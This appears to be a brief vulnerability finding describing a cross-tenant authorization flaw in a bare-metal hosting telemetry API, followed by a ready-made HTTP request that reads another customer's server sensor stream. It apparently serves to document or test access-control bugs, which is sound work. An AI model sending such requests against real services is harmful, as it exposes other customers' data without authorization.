diagnosis: The endpoint streams live hardware sensor telemetry using serverId without checking if the server belongs to the calling API key's organization. Any API key holder can monitor hardware temperatures and fan speeds of other customers' bare-metal servers.
exploit_request:
GET /api/metrics/srv_datacenter_rack_99182/chunked-stream HTTP/1.1
Host: telematics.baremetal.io
X-API-Key: live_key_customer_01
